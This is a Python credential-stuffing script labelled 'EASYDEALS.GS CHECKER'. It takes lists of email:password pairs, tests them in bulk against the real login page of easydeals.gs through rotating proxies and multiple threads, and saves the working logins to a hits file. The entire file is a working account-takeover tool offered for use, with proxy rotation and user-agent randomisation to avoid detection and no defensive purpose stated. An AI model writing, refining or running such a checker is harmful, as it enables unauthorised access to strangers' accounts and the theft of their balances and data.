import os
import random
import requests
import time
import warnings
import threading
import shutil
from queue import Queue
from colorama import init, Fore, Style

warnings.filterwarnings("ignore")
init(autoreset=True)
columns = shutil.get_terminal_size(fallback=(80, 20)).columns
os.system('cls' if os.name == 'nt' else 'clear')

print(f"{Fore.CYAN}{'EASYDEALS.GS CHECKER'.center(columns)}")
print(f"{Fore.YELLOW}{'Code By — @LEGEND_BL'.center(columns)}")

combo_file = input(f"\n{Fore.CYAN}Combo file (default: combo.txt): {Style.RESET_ALL}").strip() or "combo.txt"

def load_combos(fn):
    try:
        with open(fn, encoding="utf-8", errors="ignore") as f:
            return [ln.strip() for ln in f if ":" in ln and ln.strip()]
    except: return []

def load_proxies():
    try:
        with open("proxy.txt", encoding="utf-8", errors="ignore") as f:
            return [ln.strip() for ln in f if ln.strip()]
    except: return []

combos = load_combos(combo_file)
proxies = load_proxies()

if not combos: input(f"{Fore.RED}No combos. Press Enter..."); exit()
if not proxies: input(f"{Fore.RED}No proxies. Press Enter..."); exit()

threads_input = input(f"{Fore.CYAN}Threads (1-50, default 10): {Style.RESET_ALL}").strip()
threads_count = max(1, min(50, int(threads_input) if threads_input.isdigit() else 10))

print(f"{Fore.CYAN}Loaded {len(combos)} combos | {len(proxies)} proxies | Threads: {threads_count}\n")

hit_counter = fail_counter = checked = 0
lock = threading.Lock()
start_time = time.time()

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
]

def format_proxy(p):
    try:
        p = p.strip()
        if not p: return None
        ptype = "http"
        if "://" in p:
            proto = p.split("://")[0].lower()
            p = p.split("://", 1)[1]
            if proto in ["socks5", "socks5h"]: ptype = "socks5h"
            elif proto == "socks4": ptype = "socks4"
        
        if "@" in p:
            auth, hp = p.rsplit("@", 1)
            h, po = hp.split(":")
            u, pw = auth.split(":", 1)
            url = f"{ptype}://{u}:{pw}@{h}:{po}"
        else:
            parts = p.split(":")
            if len(parts) == 4:
                url = f"{ptype}://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
            elif len(parts) == 2:
                url = f"{ptype}://{parts[0]}:{parts[1]}"
            else: return None
        return {"http": url, "https": url}
    except: return None

def get_cpm():
    elapsed = time.time() - start_time
    return round((checked / elapsed) * 60, 1) if elapsed > 0 else 0

def check_account(email, pwd, proxy_dict):
    s = requests.Session()
    ua = random.choice(USER_AGENTS)
    
    try:
        headers = {
            "User-Agent": ua,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
        }
        
        # Get login page
        s.get("https://easydeals.gs/login", headers=headers, proxies=proxy_dict, timeout=15, verify=False)
        
        # Submit login form
        headers["Content-Type"] = "application/x-www-form-urlencoded"
        headers["Origin"] = "https://easydeals.gs"
        headers["Referer"] = "https://easydeals.gs/login"
        
        r = s.post("https://easydeals.gs/login",
                   data={"username": email, "password": pwd, "login": "1"},
                   headers=headers, proxies=proxy_dict, timeout=15, verify=False, allow_redirects=True)
        
        txt = r.text.lower()
        url = r.url.lower()
        
        if any(x in url for x in ["dashboard", "panel", "account"]) or any(x in txt for x in ["balance", "logout", "welcome"]):
            return "hit", "Valid"
        elif any(x in txt for x in ["invalid", "incorrect", "wrong", "error"]):
            return "fail", "Invalid"
        return "fail", f"Status {r.status_code}"
    except requests.exceptions.Timeout:
        return "error", "Timeout"
    except:
        return "error", "Error"

def worker(q):
    global checked, hit_counter, fail_counter
    while True:
        try: combo = q.get_nowait()
        except: break
        
        parts = combo.split(":", 1)
        if len(parts) != 2: q.task_done(); continue
        email, pwd = parts
        
        result, reason = "error", "No proxy"
        for _ in range(3):
            proxy_dict = format_proxy(random.choice(proxies))
            if proxy_dict:
                result, reason = check_account(email, pwd, proxy_dict)
                if result != "error": break
                time.sleep(0.5)
        
        with lock:
            checked += 1
            if result == "hit":
                hit_counter += 1
                print(f"{Fore.GREEN}[HIT] {email}:{pwd} | CPM: {get_cpm()}")
                with open("Easydeals_Hits.txt", "a") as f: f.write(f"{email}:{pwd}\n")
            else:
                fail_counter += 1
                print(f"{Fore.RED}[FAIL] {email}:{pwd} | {reason} | CPM: {get_cpm()}")
        
        q.task_done()
        time.sleep(0.1)

def main():
    q = Queue()
    for c in combos: q.put(c)
    open("Easydeals_Hits.txt", "w").close()
    for _ in range(threads_count):
        threading.Thread(target=worker, args=(q,), daemon=True).start()
    q.join()
    print(f"\n{Fore.CYAN}Done! Hits: {hit_counter} | Failed: {fail_counter} | CPM: {get_cpm()}")
    input("Press Enter...")

if __name__ == "__main__":
    main()
